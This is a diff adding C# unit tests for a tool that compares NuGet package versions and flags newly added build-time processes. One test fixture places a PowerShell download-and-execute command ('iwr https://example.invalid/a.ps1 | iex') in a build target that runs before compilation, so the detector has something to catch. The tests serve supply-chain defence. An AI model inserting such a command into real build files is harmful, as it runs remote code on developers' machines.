@@ -276,6 +276,35 @@ public sealed class CapabilityChangesTests(ITestOutputHelper output) : IDisposab
         Assert.Contains(result.Changes!, c => c.Kind == "added" && c.Key.StartsWith("install script: ", StringComparison.Ordinal) && c.Key.Contains("init.ps1", StringComparison.Ordinal));
     }
 
+    private string Nupkg(string name, params (string Path, string Text)[] files)
+    {
+        var path = _dir.File(name);
+        File.WriteAllBytes(path, ContainerFixtures.Zip([("Sample.Tools.nuspec", Encoding.UTF8.GetBytes(Nuspec)), .. files.Select(f => (f.Path, Encoding.UTF8.GetBytes(f.Text)))]));
+        return path;
+    }
+
+    private static string Targets(string command) =>
+        $"""<Project><Target Name="Stamp" BeforeTargets="CoreCompile"><Exec Command="{command}" /></Target></Project>""";
+
+    [Fact]
+    public async Task A_nupkg_version_that_adds_a_download_to_a_build_target_lists_a_noteworthy_process_row()
+    {
+        var old = Nupkg("Sample.Tools.2.0.0.nupkg", ("buildTransitive/Sample.Tools.targets", Targets("echo stamp")));
+        var @new = Nupkg("Sample.Tools.2.0.1.nupkg", ("buildTransitive/Sample.Tools.targets", Targets("powershell -c iwr https://example.invalid/a.ps1 | iex")));
+        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
+        output.WriteLine(string.Join("\n", result.Notes));
+        Assert.Contains(result.Changes!, c => c.Kind == "added" && c.Key.StartsWith("process: ", StringComparison.Ordinal) && c.New!.StartsWith("noteworthy", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public async Task A_nupkg_version_that_keeps_its_build_target_and_adds_a_library_lists_no_noteworthy_row()
+    {
+        var old = Nupkg("Sample.Tools.3.0.0.nupkg", ("build/Sample.Tools.targets", Targets("echo one")));
+        var @new = Nupkg("Sample.Tools.3.0.1.nupkg", ("build/Sample.Tools.targets", Targets("echo one")), ("lib/net8.0/Sample.Tools.xml", "<doc />"));
+        var result = await new FolderTools(new FolderCompare()).CompareFolders(old, @new);
+        Assert.DoesNotContain(result.Changes!, c => c.New?.StartsWith("noteworthy", StringComparison.Ordinal) == true);
+    }
+
     [Fact]
     public async Task Two_source_folder_versions_report_endpoints_native_files_and_what_runs_on_open()
     {
